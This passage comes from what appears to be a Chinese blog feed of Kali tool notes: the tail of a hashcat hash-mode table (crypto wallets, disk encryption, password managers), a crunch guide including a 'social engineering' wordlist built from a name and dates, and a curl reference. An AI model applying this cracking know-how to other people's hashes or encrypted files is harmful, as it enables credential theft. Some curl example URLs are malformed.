               | HTTP, SMTP, LDAP Server</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 1600 | Apache $apr1$ MD5, md5apr1, MD5 (APR)            | HTTP, SMTP, LDAP Server</span></pre></td></tr><tr><td class="code"><pre><span class="line">12600 | ColdFusion 10+                                   | HTTP, SMTP, LDAP Server</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 1421 | hMailServer                                      | HTTP, SMTP, LDAP Server</span></pre></td></tr><tr><td class="code"><pre><span class="line">  101 | nsldap, SHA-1(Base64), Netscape LDAP SHA         | HTTP, SMTP, LDAP Server</span></pre></td></tr><tr><td class="code"><pre><span class="line">  111 | nsldaps, SSHA-1(Base64), Netscape LDAP SSHA      | HTTP, SMTP, LDAP Server</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 1411 | SSHA-256(Base64), LDAP &#123;SSHA256&#125;                 | HTTP, SMTP, LDAP Server</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 1711 | SSHA-512(Base64), LDAP &#123;SSHA512&#125;                 | HTTP, SMTP, LDAP Server</span></pre></td></tr><tr><td class="code"><pre><span class="line">16400 | CRAM-MD5 Dovecot                                 | HTTP, SMTP, LDAP Server</span></pre></td></tr><tr><td class="code"><pre><span class="line">15000 | FileZilla Server &gt;&#x3D; 0.9.55                       | FTP Server</span></pre></td></tr><tr><td class="code"><pre><span class="line">11500 | CRC32                                            | Checksums</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 3000 | LM                                               | Operating Systems</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 1000 | NTLM                                             | Operating Systems</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 1100 | Domain Cached Credentials (DCC), MS Cache        | Operating Systems</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 2100 | Domain Cached Credentials 2 (DCC2), MS Cache 2   | Operating Systems</span></pre></td></tr><tr><td class="code"><pre><span class="line">15300 | DPAPI masterkey file v1                          | Operating Systems</span></pre></td></tr><tr><td class="code"><pre><span class="line">15900 | DPAPI masterkey file v2                          | Operating Systems</span></pre></td></tr><tr><td class="code"><pre><span class="line">12800 | MS-AzureSync  PBKDF2-HMAC-SHA256                 | Operating Systems</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 1500 | descrypt, DES (Unix), Traditional DES            | Operating Systems</span></pre></td></tr><tr><td class="code"><pre><span class="line">12400 | BSDi Crypt, Extended DES                         | Operating Systems</span></pre></td></tr><tr><td class="code"><pre><span class="line">  500 | md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5)        | Operating Systems</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 3200 | bcrypt $2*$, Blowfish (Unix)                     | Operating Systems</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 7400 | sha256crypt $5$, SHA256 (Unix)                   | Operating Systems</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 1800 | sha512crypt $6$, SHA512 (Unix)                   | Operating Systems</span></pre></td></tr><tr><td class="code"><pre><span class="line">  122 | macOS v10.4, MacOS v10.5, MacOS v10.6            | Operating Systems</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 1722 | macOS v10.7                                      | Operating Systems</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 7100 | macOS v10.8+ (PBKDF2-SHA512)                     | Operating Systems</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 6300 | AIX &#123;smd5&#125;                                       | Operating Systems</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 6700 | AIX &#123;ssha1&#125;                                      | Operating Systems</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 6400 | AIX &#123;ssha256&#125;                                    | Operating Systems</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 6500 | AIX &#123;ssha512&#125;                                    | Operating Systems</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 2400 | Cisco-PIX MD5                                    | Operating Systems</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 2410 | Cisco-ASA MD5                                    | Operating Systems</span></pre></td></tr><tr><td class="code"><pre><span class="line">  500 | Cisco-IOS $1$ (MD5)                              | Operating Systems</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 5700 | Cisco-IOS type 4 (SHA256)                        | Operating Systems</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 9200 | Cisco-IOS $8$ (PBKDF2-SHA256)                    | Operating Systems</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 9300 | Cisco-IOS $9$ (scrypt)                           | Operating Systems</span></pre></td></tr><tr><td class="code"><pre><span class="line">   22 | Juniper NetScreen&#x2F;SSG (ScreenOS)                 | Operating Systems</span></pre></td></tr><tr><td class="code"><pre><span class="line">  501 | Juniper IVE                                      | Operating Systems</span></pre></td></tr><tr><td class="code"><pre><span class="line">15100 | Juniper&#x2F;NetBSD sha1crypt                         | Operating Systems</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 7000 | FortiGate (FortiOS)                              | Operating Systems</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 5800 | Samsung Android Password&#x2F;PIN                     | Operating Systems</span></pre></td></tr><tr><td class="code"><pre><span class="line">13800 | Windows Phone 8+ PIN&#x2F;password                    | Operating Systems</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 8100 | Citrix NetScaler                                 | Operating Systems</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 8500 | RACF                                             | Operating Systems</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 7200 | GRUB 2                                           | Operating Systems</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 9900 | Radmin2                                          | Operating Systems</span></pre></td></tr><tr><td class="code"><pre><span class="line">  125 | ArubaOS                                          | Operating Systems</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 7700 | SAP CODVN B (BCODE)                              | Enterprise Application Software (EAS)</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 7701 | SAP CODVN B (BCODE) via RFC_READ_TABLE           | Enterprise Application Software (EAS)</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 7800 | SAP CODVN F&#x2F;G (PASSCODE)                         | Enterprise Application Software (EAS)</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 7801 | SAP CODVN F&#x2F;G (PASSCODE) via RFC_READ_TABLE      | Enterprise Application Software (EAS)</span></pre></td></tr><tr><td class="code"><pre><span class="line">10300 | SAP CODVN H (PWDSALTEDHASH) iSSHA-1              | Enterprise Application Software (EAS)</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 8600 | Lotus Notes&#x2F;Domino 5                             | Enterprise Application Software (EAS)</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 8700 | Lotus Notes&#x2F;Domino 6                             | Enterprise Application Software (EAS)</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 9100 | Lotus Notes&#x2F;Domino 8                             | Enterprise Application Software (EAS)</span></pre></td></tr><tr><td class="code"><pre><span class="line">  133 | PeopleSoft                                       | Enterprise Application Software (EAS)</span></pre></td></tr><tr><td class="code"><pre><span class="line">13500 | PeopleSoft PS_TOKEN                              | Enterprise Application Software (EAS)</span></pre></td></tr><tr><td class="code"><pre><span class="line">11600 | 7-Zip                                            | Archives</span></pre></td></tr><tr><td class="code"><pre><span class="line">12500 | RAR3-hp                                          | Archives</span></pre></td></tr><tr><td class="code"><pre><span class="line">13000 | RAR5                                             | Archives</span></pre></td></tr><tr><td class="code"><pre><span class="line">13200 | AxCrypt                                          | Archives</span></pre></td></tr><tr><td class="code"><pre><span class="line">13300 | AxCrypt in-memory SHA1                           | Archives</span></pre></td></tr><tr><td class="code"><pre><span class="line">13600 | WinZip                                           | Archives</span></pre></td></tr><tr><td class="code"><pre><span class="line">14700 | iTunes backup &lt; 10.0                             | Backup</span></pre></td></tr><tr><td class="code"><pre><span class="line">14800 | iTunes backup &gt;&#x3D; 10.0                            | Backup</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 62XY | TrueCrypt                                        | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="code"><pre><span class="line">   X  | 1 &#x3D; PBKDF2-HMAC-RIPEMD160                        | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="code"><pre><span class="line">   X  | 2 &#x3D; PBKDF2-HMAC-SHA512                           | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="code"><pre><span class="line">   X  | 3 &#x3D; PBKDF2-HMAC-Whirlpool                        | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="code"><pre><span class="line">   X  | 4 &#x3D; PBKDF2-HMAC-RIPEMD160 + boot-mode            | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="code"><pre><span class="line">    Y | 1 &#x3D; XTS  512 bit pure AES                        | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="code"><pre><span class="line">    Y | 1 &#x3D; XTS  512 bit pure Serpent                    | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="code"><pre><span class="line">    Y | 1 &#x3D; XTS  512 bit pure Twofish                    | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="code"><pre><span class="line">    Y | 2 &#x3D; XTS 1024 bit pure AES                        | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="code"><pre><span class="line">    Y | 2 &#x3D; XTS 1024 bit pure Serpent                    | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="code"><pre><span class="line">    Y | 2 &#x3D; XTS 1024 bit pure Twofish                    | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="code"><pre><span class="line">    Y | 2 &#x3D; XTS 1024 bit cascaded AES-Twofish            | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="code"><pre><span class="line">    Y | 2 &#x3D; XTS 1024 bit cascaded Serpent-AES            | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="code"><pre><span class="line">    Y | 2 &#x3D; XTS 1024 bit cascaded Twofish-Serpent        | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="code"><pre><span class="line">    Y | 3 &#x3D; XTS 1536 bit all                             | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 8800 | Android FDE &lt;&#x3D; 4.3                               | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="code"><pre><span class="line">12900 | Android FDE (Samsung DEK)                        | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="code"><pre><span class="line">12200 | eCryptfs                                         | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="code"><pre><span class="line">137XY | VeraCrypt                                        | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="code"><pre><span class="line">   X  | 1 &#x3D; PBKDF2-HMAC-RIPEMD160                        | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="code"><pre><span class="line">   X  | 2 &#x3D; PBKDF2-HMAC-SHA512                           | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="code"><pre><span class="line">   X  | 3 &#x3D; PBKDF2-HMAC-Whirlpool                        | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="code"><pre><span class="line">   X  | 4 &#x3D; PBKDF2-HMAC-RIPEMD160 + boot-mode            | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="code"><pre><span class="line">   X  | 5 &#x3D; PBKDF2-HMAC-SHA256                           | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="code"><pre><span class="line">   X  | 6 &#x3D; PBKDF2-HMAC-SHA256 + boot-mode               | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="code"><pre><span class="line">   X  | 7 &#x3D; PBKDF2-HMAC-Streebog-512                     | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="code"><pre><span class="line">    Y | 1 &#x3D; XTS  512 bit pure AES                        | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="code"><pre><span class="line">    Y | 1 &#x3D; XTS  512 bit pure Serpent                    | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="code"><pre><span class="line">    Y | 1 &#x3D; XTS  512 bit pure Twofish                    | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="code"><pre><span class="line">    Y | 1 &#x3D; XTS  512 bit pure Camellia                   | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="code"><pre><span class="line">    Y | 1 &#x3D; XTS  512 bit pure Kuznyechik                 | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="code"><pre><span class="line">    Y | 2 &#x3D; XTS 1024 bit pure AES                        | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="code"><pre><span class="line">    Y | 2 &#x3D; XTS 1024 bit pure Serpent                    | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="code"><pre><span class="line">    Y | 2 &#x3D; XTS 1024 bit pure Twofish                    | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="code"><pre><span class="line">    Y | 2 &#x3D; XTS 1024 bit pure Camellia                   | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="code"><pre><span class="line">    Y | 2 &#x3D; XTS 1024 bit pure Kuznyechik                 | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="code"><pre><span class="line">    Y | 2 &#x3D; XTS 1024 bit cascaded AES-Twofish            | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="code"><pre><span class="line">    Y | 2 &#x3D; XTS 1024 bit cascaded Camellia-Kuznyechik    | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="code"><pre><span class="line">    Y | 2 &#x3D; XTS 1024 bit cascaded Camellia-Serpent       | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="code"><pre><span class="line">    Y | 2 &#x3D; XTS 1024 bit cascaded Kuznyechik-AES         | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="code"><pre><span class="line">    Y | 2 &#x3D; XTS 1024 bit cascaded Kuznyechik-Twofish     | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="code"><pre><span class="line">    Y | 2 &#x3D; XTS 1024 bit cascaded Serpent-AES            | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="code"><pre><span class="line">    Y | 2 &#x3D; XTS 1024 bit cascaded Twofish-Serpent        | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="code"><pre><span class="line">    Y | 3 &#x3D; XTS 1536 bit all                             | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="code"><pre><span class="line">14600 | LUKS                                             | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="code"><pre><span class="line">16700 | FileVault 2                                      | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="code"><pre><span class="line">18300 | Apple File System (APFS)                         | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 9700 | MS Office &lt;&#x3D; 2003 $0&#x2F;$1, MD5 + RC4               | Documents</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 9710 | MS Office &lt;&#x3D; 2003 $0&#x2F;$1, MD5 + RC4, collider #1  | Documents</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 9720 | MS Office &lt;&#x3D; 2003 $0&#x2F;$1, MD5 + RC4, collider #2  | Documents</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 9800 | MS Office &lt;&#x3D; 2003 $3&#x2F;$4, SHA1 + RC4              | Documents</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 9810 | MS Office &lt;&#x3D; 2003 $3, SHA1 + RC4, collider #1    | Documents</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 9820 | MS Office &lt;&#x3D; 2003 $3, SHA1 + RC4, collider #2    | Documents</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 9400 | MS Office 2007                                   | Documents</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 9500 | MS Office 2010                                   | Documents</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 9600 | MS Office 2013                                   | Documents</span></pre></td></tr><tr><td class="code"><pre><span class="line">10400 | PDF 1.1 - 1.3 (Acrobat 2 - 4)                    | Documents</span></pre></td></tr><tr><td class="code"><pre><span class="line">10410 | PDF 1.1 - 1.3 (Acrobat 2 - 4), collider #1       | Documents</span></pre></td></tr><tr><td class="code"><pre><span class="line">10420 | PDF 1.1 - 1.3 (Acrobat 2 - 4), collider #2       | Documents</span></pre></td></tr><tr><td class="code"><pre><span class="line">10500 | PDF 1.4 - 1.6 (Acrobat 5 - 8)                    | Documents</span></pre></td></tr><tr><td class="code"><pre><span class="line">10600 | PDF 1.7 Level 3 (Acrobat 9)                      | Documents</span></pre></td></tr><tr><td class="code"><pre><span class="line">10700 | PDF 1.7 Level 8 (Acrobat 10 - 11)                | Documents</span></pre></td></tr><tr><td class="code"><pre><span class="line">16200 | Apple Secure Notes                               | Documents</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 9000 | Password Safe v2                                 | Password Managers</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 5200 | Password Safe v3                                 | Password Managers</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 6800 | LastPass + LastPass sniffed                      | Password Managers</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 6600 | 1Password, agilekeychain                         | Password Managers</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 8200 | 1Password, cloudkeychain                         | Password Managers</span></pre></td></tr><tr><td class="code"><pre><span class="line">11300 | Bitcoin&#x2F;Litecoin wallet.dat                      | Password Managers</span></pre></td></tr><tr><td class="code"><pre><span class="line">12700 | Blockchain, My Wallet                            | Password Managers</span></pre></td></tr><tr><td class="code"><pre><span class="line">15200 | Blockchain, My Wallet, V2                        | Password Managers</span></pre></td></tr><tr><td class="code"><pre><span class="line">16600 | Electrum Wallet (Salt-Type 1-3)                  | Password Managers</span></pre></td></tr><tr><td class="code"><pre><span class="line">13400 | KeePass 1 (AES&#x2F;Twofish) and KeePass 2 (AES)      | Password Managers</span></pre></td></tr><tr><td class="code"><pre><span class="line">15500 | JKS Java Key Store Private Keys (SHA1)           | Password Managers</span></pre></td></tr><tr><td class="code"><pre><span class="line">15600 | Ethereum Wallet, PBKDF2-HMAC-SHA256              | Password Managers</span></pre></td></tr><tr><td class="code"><pre><span class="line">15700 | Ethereum Wallet, SCRYPT                          | Password Managers</span></pre></td></tr><tr><td class="code"><pre><span class="line">16300 | Ethereum Pre-Sale Wallet, PBKDF2-HMAC-SHA256     | Password Managers</span></pre></td></tr><tr><td class="code"><pre><span class="line">16900 | Ansible Vault                                    | Password Managers</span></pre></td></tr><tr><td class="code"><pre><span class="line">18100 | TOTP (HMAC-SHA1)                                 | One-Time Passwords</span></pre></td></tr><tr><td class="code"><pre><span class="line">99999 | Plaintext                                        | Plaintext</span></pre></td></tr></table></figure>


</li>
</ul>
<pre><code>```</code></pre>]]></content>
      <categories>
        <category>tools</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>kali</tag>
        <tag>command</tag>
        <tag>hash密码破解</tag>
      </tags>
  </entry>
  <entry>
    <title>crunch</title>
    <url>/2019/12/11/crunch/</url>
    <content><![CDATA[<h1 id="crunch"><a href="#crunch" class="headerlink" title="crunch"></a>crunch</h1><ul>
<li><h2 id="快捷使用"><a href="#快捷使用" class="headerlink" title="快捷使用"></a>快捷使用</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">crunch 4 4 -t %^@,    &#x2F;&#x2F;生成4位数字，特殊字符，小写大写字母</span></pre></td></tr></table></figure>
</li>
<li><h2 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">min    设定最小字符串长度（必选）</span></pre></td></tr><tr><td class="code"><pre><span class="line">  max    设定最大字符串长度（必选）</span></pre></td></tr><tr><td class="code"><pre><span class="line">  &#x2F;&#x2F;默认位小写字符集</span></pre></td></tr><tr><td class="code"><pre><span class="line">  oprions</span></pre></td></tr><tr><td class="code"><pre><span class="line">  -b     指定文件输出的大小，避免字典文件过大  </span></pre></td></tr><tr><td class="code"><pre><span class="line">  -c     指定文件输出的行数，即包含密码的个数</span></pre></td></tr><tr><td class="code"><pre><span class="line">  -d     限制相同元素出现的次数</span></pre></td></tr><tr><td class="code"><pre><span class="line">  -e     定义停止字符，即到该字符串就停止生成</span></pre></td></tr><tr><td class="code"><pre><span class="line">  -f     调用库文件（&#x2F;etc&#x2F;share&#x2F;crunch&#x2F;charset.lst）</span></pre></td></tr><tr><td class="code"><pre><span class="line">  -i     改变输出格式，即aaa,aab -&gt; aaa,baa</span></pre></td></tr><tr><td class="code"><pre><span class="line">  -I     通常与-t联合使用，表明该字符为实义字符</span></pre></td></tr><tr><td class="code"><pre><span class="line">  -m     通常与-p搭配</span></pre></td></tr><tr><td class="code"><pre><span class="line">  -o     将密码保存到指定文件</span></pre></td></tr><tr><td class="code"><pre><span class="line">  -p     指定元素以组合的方式进行</span></pre></td></tr><tr><td class="code"><pre><span class="line">  -q     读取密码文件，即读取pass.txt</span></pre></td></tr><tr><td class="code"><pre><span class="line">  -r     定义重某一字符串重新开始</span></pre></td></tr><tr><td class="code"><pre><span class="line">  -s     指定一个开始的字符，即从自己定义的密码xxxx开始</span></pre></td></tr><tr><td class="code"><pre><span class="line">  -t     指定密码输出的格式</span></pre></td></tr><tr><td class="code"><pre><span class="line">  -u     禁止打印百分比（必须为最后一个选项）</span></pre></td></tr><tr><td class="code"><pre><span class="line">  -z     压缩生成的字典文件，支持gzip,bzip2,lzma,7z</span></pre></td></tr></table></figure>

<ul>
<li><h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><ol>
<li><p>生成自己制定字符集的字典(字符集中有空格需要双引号或者空格转义)</p>
<p><code>crunch 2 4 &quot;abc &quot;</code></p>
</li>
<li><p>生成数个元素组合（社工字典 max min参数无效）</p>
<p><code>crunch 4 4 -p zhangsan 2018 0101</code></p>
</li>
<li><p>生成某字符串的所有组合</p>
<p><code>crunch 4 4 -p abc</code></p>
</li>
<li><p>生成指定格式字符串</p>
<p><code>crunch 4 4 -t %^@, -o ./dict.txt</code></p>
</li>
<li><p>设置字符集</p>
<p><code>crunch 6 6 -f /usr/share/crunch/charset.lst 字符集 -t %%dog@ //@表示当前字符集</code></p>
</li>
<li><p>指定某类字符的集合</p>
<p>生成3位密码，第一位由是123，第三位bcd,<strong>+为占位符</strong></p>
<p><code>crunch 3 3 bcd + 123 + -t %@^ -f charset.lst  mixalpha-numeric-all-space</code></p>
</li>
<li><p>生成5个元素组成的密码，前三个为固定字符，后两个为小写大写字符,<strong>d为占位符</strong></p>
<p><code>crunch 5 5 -t ddd@, -p dog cat bird</code></p>
</li>
<li><p>去除-t参数中的特殊字符含义,<strong>a为占位符</strong></p>
<p><code>crunch 5 5 -t p@as% -I a@aaa</code></p>
</li>
</ol>
</li>
<li><p>详情</p>
<p><a href="https://blog.csdn.net/fox_wayen/article/details/78429140" target="_blank" rel="noopener">详解</a></p>
</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>tools</category>
      </categories>
      <tags>
        <tag>tools</tag>
        <tag>linux</tag>
        <tag>kali</tag>
      </tags>
  </entry>
  <entry>
    <title>curl</title>
    <url>/2019/12/11/curl/</url>
    <content><![CDATA[<h1 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p> 在Linux中curl是一个利用URL规则在命令行下工作的文件传输工具，可以说是一款很强大的http命令行工具。它支持文件的上传和下载，是综合传输工具，但按传统，习惯称url为下载工具。 </p>
<a id="more"></a>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">语法：# curl [option] [url]</span></pre></td></tr></table></figure>

<h3 id="常见参数"><a href="#常见参数" class="headerlink" title="常见参数"></a>常见参数</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-A&#x2F;--user-agent &lt;string&gt;                  设置UA发送给服务器</span></pre></td></tr><tr><td class="code"><pre><span class="line">-b&#x2F;--cookie &lt;name&#x3D;string&#x2F;file&gt;   	   	  cookie字符串或文件读取位置</span></pre></td></tr><tr><td class="code"><pre><span class="line">-c&#x2F;--cookie-jar &lt;file&gt;                    操作结束后把cookie写入到这个文件中</span></pre></td></tr><tr><td class="code"><pre><span class="line">-C&#x2F;--continue-at &lt;offset&gt;           	  断点续转</span></pre></td></tr><tr><td class="code"><pre><span class="line">-D&#x2F;--dump-header &lt;file&gt;             	  把header信息写入到该文件中</span></pre></td></tr><tr><td class="code"><pre><span class="line">-e&#x2F;--referer                              来源网址</span></pre></td></tr><tr><td class="code"><pre><span class="line">-f&#x2F;--fail                                 连接失败时不显示http错误</span></pre></td></tr><tr><td class="code"><pre><span class="line">-o&#x2F;--output                               把输出写到该文件中</span></pre></td></tr><tr><td class="code"><pre><span class="line">-O&#x2F;--remote-name                     	  把输出写到该文件中，保留远程文件的文件名</span></pre></td></tr><tr><td class="code"><pre><span class="line">-r&#x2F;--range &lt;range&gt;                        检索来自HTTP&#x2F;1.1或FTP服务器字节范围</span></pre></td></tr><tr><td class="code"><pre><span class="line">-s&#x2F;--silent                               静音模式。不输出任何东西</span></pre></td></tr><tr><td class="code"><pre><span class="line">-T&#x2F;--upload-file &lt;file&gt;                   上传文件</span></pre></td></tr><tr><td class="code"><pre><span class="line">-u&#x2F;--user &lt;user[:password]&gt;    		      设置服务器的用户和密码</span></pre></td></tr><tr><td class="code"><pre><span class="line">-w&#x2F;--write-out [format]                   什么输出完成后</span></pre></td></tr><tr><td class="code"><pre><span class="line">-x&#x2F;--proxy &lt;host[:port]&gt;           	      在给定的端口上使用HTTP代理</span></pre></td></tr><tr><td class="code"><pre><span class="line">-#&#x2F;--progress-bar                         进度条显示当前的传送状态</span></pre></td></tr></table></figure>

<h3 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h3><ol>
<li><p><code>curl http://www.befallhell.cn</code></p>
<p>将结果输出到标准输出</p>
</li>
<li><p><code>curl http://www.befallhell.com &gt;&gt; file</code></p>
<p><code>curl http://www.befallhell.com -o file</code></p>
<p><code>curl  -O http://www.befallhell.cn/test.html</code></p>
<p>结果输出到文件或服务端同名文件</p>
<ol start="3">
<li><p><code>curl -o /dev/null -s -w %{http_code} http://www.befallhell.cn</code></p>
<p>测试网页返回值 </p>
</li>
</ol>
</li>
<li><p><code>curl -x 192.168.100.100:1080 http://www.befallhell.cn</code></p>
<p> 指定proxy服务器以及其端口 </p>
</li>
<li><p><code>curl -c cookies.txt http://www.befallhell.cn</code></p>
<p><code>curl -D header.txt http://www.befallhell.cn</code></p>
<p>保存cookie与header</p>
</li>
<li><p><code>curl -b cookies.txt http://www.befallhell.cn</code></p>
<p>使用cookies文件</p>
</li>
<li><p><code>curl -A &quot;Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.0)&quot;  http://www.befallhell.cn</code></p>
<p>更改</p>
</li>
<li><p><code>curl -e &quot;127.0.0.1&quot; http://www.befallhell.cn</code></p>
<p> 伪造referer</p>
</li>
<li><p><code>curl -O -# ftp://用户名:密码@http://www.befallhell.cn/1.jpg</code></p>
<p> ftp下载并显示下载进度条</p>
</li>
<li><p><code>curl -T dodo1.JPG -u 用户名:密码 ftp://http://www.befallhell.cn/public/</code></p>
<p>上传文件</p>
</li>
<li><p><code>curl -I http://www.befallhell.cn</code></p>
<p> 显示头信息</p>
</li>
</ol>
<h3 id="其他参数"><a href="#其他参数" class="headerlink" title="其他参数"></a>其他参数</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-a&#x2F;--append                        上传文件时，附加到目标文件</span></pre></td></tr><tr><td class="code"><pre><span class="line">--anyauth                            可以使用“任何”身份验证方法</span></pre></td></tr><tr><td class="code"><pre><span class="line">--basic                                使用HTTP基本验证</span></pre></td></tr><tr><td class="code"><pre><span class="line">-B&#x2F;--use-ascii                      使用ASCII文本传输</span></pre></td></tr><tr><td class="code"><pre><span class="line">*-d&#x2F;--data &lt;data&gt;                  HTTP POST方式传送数据</span></pre></td></tr><tr><td class="code"><pre><span class="line">--data-ascii &lt;data&gt;            以ascii的方式post数据</span></pre></td></tr><tr><td class="code"><pre><span class="line">--data-binary &lt;data&gt;          以二进制的方式post数据</span></pre></td></tr><tr><td class="code"><pre><span class="line">--negotiate                          使用HTTP身份验证</span></pre></td></tr><tr><td class="code"><pre><span class="line">--digest                        使用数字身份验证</span></pre></td></tr><tr><td class="code"><pre><span class="line">--disable-eprt                  禁止使用EPRT或LPRT</span></pre></td></tr><tr><td class="code"><pre><span class="line">--disable-epsv                  禁止使用EPSV</span></pre></td></tr><tr><td class="code"><pre><span class="line">--egd-file &lt;file&gt;              为随机数据(SSL)设置EGD socket路径</span></pre></td></tr><tr><td class="code"><pre><span class="line">--tcp-nodelay                  使用TCP_NODELAY选项</span></pre></td></tr><tr><td class="code"><pre><span class="line">-E&#x2F;--cert &lt;cert[:passwd]&gt;      客户端证书文件和密码 (SSL)</span></pre></td></tr><tr><td class="code"><pre><span class="line">--cert-type &lt;type&gt;              证书文件类型 (DER&#x2F;PEM&#x2F;ENG) (SSL)</span></pre></td></tr><tr><td class="code"><pre><span class="line">--key &lt;key&gt;                    私钥文件名 (SSL)</span></pre></td></tr><tr><td class="code"><pre><span class="line">--key-type &lt;type&gt;              私钥文件类型 (DER&#x2F;PEM&#x2F;ENG) (SSL)</span></pre></td></tr><tr><td class="code"><pre><span class="line">--pass  &lt;pass&gt;                  私钥密码 (SSL)</span></pre></td></tr><tr><td class="code"><pre><span class="line">--engine &lt;eng&gt;                  加密引擎使用 (SSL). &quot;--engine list&quot; for list</span></pre></td></tr><tr><td class="code"><pre><span class="line">--cacert &lt;file&gt;                CA证书 (SSL)</span></pre></td></tr><tr><td class="code"><pre><span class="line">--capath &lt;directory&gt;            CA目   (made 